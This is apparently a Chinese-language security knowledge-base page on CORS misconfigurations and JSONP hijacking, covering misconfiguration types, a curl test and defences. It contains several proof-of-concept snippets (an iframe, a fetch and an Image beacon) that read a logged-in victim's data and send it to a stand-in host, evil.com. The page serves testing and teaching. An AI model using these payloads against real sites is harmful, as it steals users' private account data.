# CORS 误配与 JSONP 劫持

## 一句话理解
跨域机制（CORS / JSONP）是为了"受控地放开同源策略"。配置一旦失误，攻击者的恶意页面就能**带着受害者的登录态读取敏感数据**——CSRF 是"帮你发请求"（写），CORS/JSONP 劫持是"替你读数据"（读）。

## 核心原理
原理层见 [VUL-CrossDomain](../vul/VUL-CrossDomain.md)，本篇聚焦利用。
- 同源策略（SOP）默认阻止跨域**读取**响应
- CORS 通过 `Access-Control-Allow-Origin`（ACAO）等响应头声明"哪些源可以读"
- `Access-Control-Allow-Credentials: true`（ACAC）表示允许浏览器带 Cookie 发起跨域读取
- 当 ACAO 由请求中的 `Origin` 头动态反射生成时，任意站点都被放行

## CORS 常见误配类型
### 1. 反射 Origin + 允许凭证（最严重）
服务端把请求的 `Origin` 原样写回 ACAO，且 ACAC 为 true。任意恶意站点可读受害者数据。

### 2. 信任 `null` Origin
白名单里写了 `null`。攻击者用 sandbox iframe 制造 null origin：

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>location='https://evil.com/?'+btoa(d))
</script>"></iframe>
```

### 3. 域名校验写错
- 前缀匹配：`https://target.com.evil.com` 通过
- 后缀匹配：`https://eviltarget.com` 通过
- 用 `includes()` 判断：`https://evil.com/?x=target.com` 通过

### 4. 信任全部子域 + 子域存在 XSS/接管
白名单放行 `*.target.com`，攻击者先拿下一个子域（XSS、子域接管），再从子域发起带凭证的跨域读取。

### 5. `ACAO: *` 的边界
`*` 与 credentials 不能同时生效（浏览器会拦截），所以 `*` 本身只能读公开资源——但如果服务端按 Cookie 区分返回内容，公开接口也可能泄露信息。

## 利用 PoC（反射 Origin 型）
攻击者页面：

```html
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/collect', {method: 'POST', body: JSON.stringify(data)}));
</script>
```

受害者登录状态下访问恶意页面，其账号数据即被外带。

## 快速判断

```bash
curl -s -I -H "Origin: https://evil.com" https://target.com/api/userinfo
```

观察响应头：
- `Access-Control-Allow-Origin: https://evil.com`（反射）且 `Access-Control-Allow-Credentials: true` -> 高危
- ACAO 为 `null`、子域、前缀绕过 -> 按类型构造利用
- 无 ACAO 或无凭证 -> 无法带身份读，降级为普通信息收集

## JSONP 劫持
### 原理
JSONP 用 `<script src>` 天然跨域。接口把数据包在回调函数里返回：

```javascript
callback({"uid": 1001, "phone": "138****1234"})
```

若接口敏感数据 + callback 可控 + 无 Referer/Token 校验，攻击者页面定义同名回调即可读走数据。

### PoC

```html
<script>
function steal(d) {
  new Image().src = 'https://evil.com/?' + encodeURIComponent(JSON.stringify(d));
}
</script>
<script src="https://target.com/api/getUserInfo?callback=steal"></script>
```

### 判断要点
- 接口返回 `callback(...)` 格式且含敏感数据（手机号、身份证、地址）
- callback 参数名常见：`callback`、`cb`、`jsonp`、`jsonpcallback`
- 校验 Referer 弱或不存在（空 Referer 有时也能过，可配合 `<meta name="referrer" content="never">`）

## 与 CSRF 的分工

| 维度 | CSRF | CORS/JSONP 劫持 |
| --- | --- | --- |
| 方向 | 写（发起状态变更） | 读（窃取响应数据） |
| 依赖 | 浏览器自动带凭证 | 服务端跨域放行 + 自动带凭证 |
| 防护 | SameSite / Token / Origin 校验 | 严格 ACAO 白名单 / Referer 校验 |

组合拳：CORS 可读 -> 读走 CSRF Token -> 再打 CSRF，防不胜防。

## 防御要点
- ACAO 使用精确白名单匹配（全等比较，不用 includes/正则偷懒）
- 非必要不开 `Access-Control-Allow-Credentials`
- JSONP 接口校验 Referer + 一次性 Token，敏感接口干脆禁用 JSONP
- 敏感响应加 `X-Content-Type-Options: nosniff`，减少被当脚本解析的风险

## 参考
- [PortSwigger - CORS](https://portswigger.net/web-security/cors)
- [跨域安全（原理篇）](../vul/VUL-CrossDomain.md)
